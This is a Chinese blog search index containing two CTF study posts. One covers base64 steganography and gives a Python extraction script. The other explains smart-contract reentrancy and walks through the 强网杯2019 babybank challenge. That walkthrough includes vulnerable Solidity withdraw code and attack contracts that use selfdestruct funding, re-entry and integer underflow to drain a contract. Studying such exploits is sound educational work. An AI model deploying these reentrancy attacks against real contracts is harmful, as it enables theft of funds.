<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/10/20/BASE64/"/>
      <url>/2023/10/20/BASE64/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="title-：-BASE64"><a href="#title-：-BASE64" class="headerlink" title="title ： BASE64"></a>title ： BASE64</h2><p>BASE64</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ZG</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">YY</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">aW</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">ZF</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">cm</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">aM</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">b2</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">dc</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">c2</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">Zf</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>解码得到 daidrhouse，然而编码得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ZA</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">YQ</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">aQ</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">ZA</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">cg</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">aA</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">bw</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">dQ</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">cw</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="attribute">ZQ</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>发现每一串的第二位都发生了改变，但是结果没变。</p><h4 id="base64原理"><a href="#base64原理" class="headerlink" title="base64原理"></a>base64原理</h4><p>顾名思义，base64编码就是用64个ascii字符作为基础来编码二进制内容的一种编码方式。相信各位一定在网页中看到过base64编码的内嵌图片，甚至QQ音乐传输歌词文件时，也采用了base64编码。将二进制编码为ascii字符，使数据在某些场景下更便于阅读、便于传输。当然，将所有二进制「浓缩」到区区64个字符来表示，一定会在体积上作出妥协。字符在编码完成后，会增大1/3倍。</p><p>由于只用到了<strong>64个字符</strong>，所以使用6个二进制位(2^6 = 64)完全可以把所有的字符表示出来，于是原来的1个字节8位在base64编码中变成了1个字节6位。</p><p>换言之：把原本的3个字节变成现在的4个字节，因为(<code>3*8 == 4*6</code>)</p><h4 id="索引表"><a href="#索引表" class="headerlink" title="索引表"></a>索引表</h4><p>base64有一张标准编码表，为64个ascii字符排序并赋予索引。</p><table><thead><tr><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">A</td><td align="left">16</td><td align="left">Q</td><td align="left">32</td><td align="left">g</td><td align="left">48</td><td align="left">w</td></tr><tr><td align="left">1</td><td align="left">B</td><td align="left">17</td><td align="left">R</td><td align="left">33</td><td align="left">h</td><td align="left">49</td><td align="left">x</td></tr><tr><td align="left">2</td><td align="left">C</td><td align="left">18</td><td align="left">S</td><td align="left">34</td><td align="left">i</td><td align="left">50</td><td align="left">y</td></tr><tr><td align="left">3</td><td align="left">D</td><td align="left">19</td><td align="left">T</td><td align="left">35</td><td align="left">j</td><td align="left">51</td><td align="left">z</td></tr><tr><td align="left">4</td><td align="left">E</td><td align="left">20</td><td align="left">U</td><td align="left">36</td><td align="left">k</td><td align="left">52</td><td align="left">0</td></tr><tr><td align="left">5</td><td align="left">F</td><td align="left">21</td><td align="left">V</td><td align="left">37</td><td align="left">l</td><td align="left">53</td><td align="left">1</td></tr><tr><td align="left">6</td><td align="left">G</td><td align="left">22</td><td align="left">W</td><td align="left">38</td><td align="left">m</td><td align="left">54</td><td align="left">2</td></tr><tr><td align="left">7</td><td align="left">H</td><td align="left">23</td><td align="left">X</td><td align="left">39</td><td align="left">n</td><td align="left">55</td><td align="left">3</td></tr><tr><td align="left">8</td><td align="left">I</td><td align="left">24</td><td align="left">Y</td><td align="left">40</td><td align="left">o</td><td align="left">56</td><td align="left">4</td></tr><tr><td align="left">9</td><td align="left">J</td><td align="left">25</td><td align="left">Z</td><td align="left">41</td><td align="left">p</td><td align="left">57</td><td align="left">5</td></tr><tr><td align="left">10</td><td align="left">K</td><td align="left">26</td><td align="left">a</td><td align="left">42</td><td align="left">q</td><td align="left">58</td><td align="left">6</td></tr><tr><td align="left">11</td><td align="left">L</td><td align="left">27</td><td align="left">b</td><td align="left">43</td><td align="left">r</td><td align="left">59</td><td align="left">7</td></tr><tr><td align="left">12</td><td align="left">M</td><td align="left">28</td><td align="left">c</td><td align="left">44</td><td align="left">s</td><td align="left">60</td><td align="left">8</td></tr><tr><td align="left">13</td><td align="left">N</td><td align="left">29</td><td align="left">d</td><td align="left">45</td><td align="left">t</td><td align="left">61</td><td align="left">9</td></tr><tr><td align="left">14</td><td align="left">O</td><td align="left">30</td><td align="left">e</td><td align="left">46</td><td align="left">u</td><td align="left">62</td><td align="left">+</td></tr><tr><td align="left">15</td><td align="left">P</td><td align="left">31</td><td align="left">f</td><td align="left">47</td><td align="left">v</td><td align="left">63</td><td align="left">/</td></tr></tbody></table><p>有时为了防止混淆（比如链接），会使用 <code>.</code> <code>_</code> 来代替索引表中的 <code>+</code> <code>/</code> 。</p><h4 id="隐写原理"><a href="#隐写原理" class="headerlink" title="隐写原理"></a>隐写原理</h4><p>base64在解码的时候，会按照字符串末尾的 <code>=</code> 数量来删除相应字节数。或许你已经发现了，当一组字符的数量为1字节或2字节的时候，会有4位或2位二进制在解码时被忽略</p><p><img src="C:\Users\86157\Desktop\OneDrive\图片\屏幕快照\NK23ZzryPj9YBpi.png" alt="NK23ZzryPj9YBpi"></p><p><img src="C:\Users\86157\Desktop\OneDrive\图片\屏幕快照\ZBpPwsz5OeaH3FG.png" alt="ZBpPwsz5OeaH3FG"></p><p>即解码时：</p><p>解密的时候首先把”=”删去，然后写出二进制数串，然后从左往右每8位一组，剩余的不足8位丢掉，然后根据转换表获得相应字符</p><p>然后每8位一组，剩余不足的丢弃，</p><p>也就是说红色部分会被忽略，所以即使对其进行改变，解码得到的结果依然不变。</p><p>解密得到的明文是不变的，那么你重新按照正确的加密流程计算一遍，如果发现结果不一样，那么就说明隐藏进了信息。</p><p>CTF题目中出现一大堆base64编码字符串的时候，更需要考虑base64隐写。</p><p>base64的脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc.txt为待解密的base64隐写字符串所在的文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pattern2用于匹配两个等号情况时，等号前的一个字符</span></span><br><span class="line"><span class="comment"># pattern2用于匹配一个等号情况时，等号前的一个字符</span></span><br><span class="line">pattern2 = <span class="string">r&#x27;(\S)==$&#x27;</span></span><br><span class="line">pattern1 = <span class="string">r&#x27;(\S)=$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取后的隐写二进制字符加入binstring中</span></span><br><span class="line">binstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐行读取待解密的base64隐写字符串，逐行处理</span></span><br><span class="line"><span class="keyword">while</span>(base64str):</span><br><span class="line">    <span class="comment"># 先匹配两个等号的情况，如果匹配不上，再配置一个等号的情况</span></span><br><span class="line">    <span class="comment"># 如果无等号，则没有隐藏，无需处理</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="built_in">compile</span>(pattern2).findall(base64str):</span><br><span class="line">        <span class="comment"># mstr为等号前的一个字符，该字符为隐写二进制信息所在的字符</span></span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern2).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 确认mstr字符对应的base64二进制数，赋值给mbin</span></span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        <span class="comment"># mbin格式如0b100，mbin[0:2]为0b</span></span><br><span class="line">        <span class="comment"># mbin[2:].zfill(6)为将0b后面的二进制数前面补0，使0b后面的长度为6</span></span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># 两个等号情况隐写了4位二进制数，所以提取mbin2的后4bit</span></span><br><span class="line">        <span class="comment"># 赋值给stegobin，这就是隐藏的二进制信息</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">4</span>:]</span><br><span class="line">        binstring += stegobin</span><br><span class="line">    <span class="keyword">elif</span> re.<span class="built_in">compile</span>(pattern1).findall(base64str):</span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern1).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># 一个等号情况隐写了2位二进制数，所以提取mbin2的后2bit</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">2</span>:]</span><br><span class="line">        binstring += stegobin</span><br><span class="line">    base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># stegobin将各行隐藏的二进制字符拼接在一起</span></span><br><span class="line"><span class="comment"># 从第0位开始，8bit、8bit处理，所以range的步进为8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(binstring),<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># int(xxx,2)，将二进制字符串转换为10进制的整数，再用chr()转为字符</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(binstring[i:i+<span class="number">8</span>],<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="NewstarCtf-2023"><a href="#NewstarCtf-2023" class="headerlink" title="NewstarCtf 2023"></a>NewstarCtf 2023</h4><h5 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h5><p>脚本解码得到</p><p>iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</p><p>即flag{b4se_1s_4_g0od_c0d3}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Re-Entrancy</title>
      <link href="/2023/10/19/Re-Entrancy/"/>
      <url>/2023/10/19/Re-Entrancy/</url>
      
        <content type="html"><![CDATA[<p>重入攻击是智能合约的经典攻击。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fallback函数是一个特殊的结构，在特定情况下会被触发。</p><p>特点：</p><ol><li>不被命名</li><li> 被外部调用，不能被自己合约的函数调用</li><li> 一个合约至多只有一个fallback函数</li><li>会在别的合约调用一个本合约没有的函数调用</li><li>当eth被发送给这个合约是，没有calldata同时没有receive函数是被触发，要设置为payable</li><li> 可以包含自己的逻辑</li></ol><p>如果没有足够的Gas，是不足以支持不断重入的。<code>call.value()</code>转账给了我们足够的Gas。</p><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:<br>向 地址类型 发送数量为 amount 的 Wei，失败时抛出 <strong>异常</strong>，发送 2300 gas 的矿工费，不可调节。</p><p><code>&lt;address&gt;.send(uint256 amount)</code>(bool):<br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 <strong>false</strong>，发送 2300 gas 的矿工费用，不可调节。</p><p><code>&lt;address&gt;.call(...)</code> (bool):<br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><code>.call</code>函数添加<code>.value</code>会附加上代币，形成转账</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Bank &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    ...</span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当balanceof充足时，就会调用转账功能。这个问题是，先转账再记账，若再次调用fallback（）函数，此时balanceof还未减少就会无限调用，可能导致gas不够用，因此需要限制次数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract hack&#123;</span><br><span class="line">address instance;</span><br><span class="line">Bank b=Bank(instance);</span><br><span class="line">bool flag=0;</span><br><span class="line">function attack()public&#123;</span><br><span class="line">b.withdraw(1 ether);</span><br><span class="line">&#125;</span><br><span class="line">function () payable&#123;</span><br><span class="line">if(!flag)&#123;</span><br><span class="line">flag=1;</span><br><span class="line">b.withdraw(1 ether);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="【强网杯2019】babybank"><a href="#【强网杯2019】babybank" class="headerlink" title="【强网杯2019】babybank"></a>【强网杯2019】babybank</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract babybank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public level;</span><br><span class="line">    address owner;</span><br><span class="line">    uint secret;</span><br><span class="line">    </span><br><span class="line">    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br><span class="line">    //Gmail is ok. 163 and qq may have some problems.</span><br><span class="line">    event sendflag(string md5ofteamtoken,string b64email); </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //pay for flag</span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 10000000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 1 </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(level[msg.sender]==0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff==0xb1b1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 2</span><br><span class="line">    function set_secret(uint new_secret) public onlyOwner&#123;</span><br><span class="line">        secret=new_secret;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint guess_secret) public&#123;</span><br><span class="line">        require(guess_secret==secret);</span><br><span class="line">        require(level[msg.sender]==1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 3</span><br><span class="line">    </span><br><span class="line">    function transfer(address to, uint amount) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(level[msg.sender]==2);</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">        balance[to] = amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount*100000000000000)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pay for flag<br>    function payforflag(string md5ofteamtoken,string b64email) public{<br>        require(balance[msg.sender] &gt;= 10000000000);<br>        balance[msg.sender]=0;<br>        owner.transfer(address(this).balance);<br>        emit sendflag(md5ofteamtoken,b64email);<br>    }</p><p>当balance超过10000000000是就会触发flag函数。</p><p>发现withdraw函数发现重入漏洞 msg.sender.call.value(amount*100000000000000)();，可以配合整数下溢漏洞从而达到balance的要求。</p><p>要完成withdraw()函数需要完成三个挑战。</p><p>第一个是profit函数</p><p>require(level[msg.sender]= =0);<br>require(uint(msg.sender) &amp; 0xffff==0xb1b1);</p><p>首先需要调用者level为0，其次需要调用者的后四位为b1b1，</p><p>level原本就是0，而后四位则可以通过网站生成固定账号，<a href="https://vanity-eth.tk/">Vanity-ETH | Ethereum vanity address generator</a></p><p>，即可绕过，此时balance以及level都为1，此时来到挑战2.</p><p>挑战2，需要猜到的与设置的guess相同。serect的值可以在合约的部署中找到。合约部署者的最后一次交易的inputdata桉树选择器前四个字节为函数的签名参数就是部署这传入的参数。</p><p>然后就可以调用withdraw函数。</p><p>但是由于合约没有任何blance因此需要先进行转账。</p><p>可以用selfdestruct函数来进行充值。</p><p>攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract kill&#123;</span><br><span class="line">function kill()payable&#123;</span><br><span class="line">selfdestruct(address(add));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract hack&#123;</span><br><span class="line">interface BabybankInterface &#123;</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">    function profit() external;</span><br><span class="line">    function guess(uint256 number) external;</span><br><span class="line">    function transfer(address to, uint256 amount) external;</span><br><span class="line">    function payforflag(string md5ofteamtoken, string b64email) external;</span><br><span class="line">&#125;</span><br><span class="line">address instance;</span><br><span class="line">BankInterface b=BankInterface(instance);</span><br><span class="line">uint flag=0;</span><br><span class="line">function attack()public payable&#123;</span><br><span class="line">b.profit();</span><br><span class="line">b.guess(0x........);</span><br><span class="line">b.withdraw(2);</span><br><span class="line">b.payforflag(&#x27;123&#x27;,&#x27;123&#x27;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function()external payable&#123;</span><br><span class="line">if(!flag)&#123;</span><br><span class="line">flag=1;</span><br><span class="line">b.withdraw(2);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。</li><li>进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。</li><li>当C有了2token便可以进行攻击，调用hacker函数即可。</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
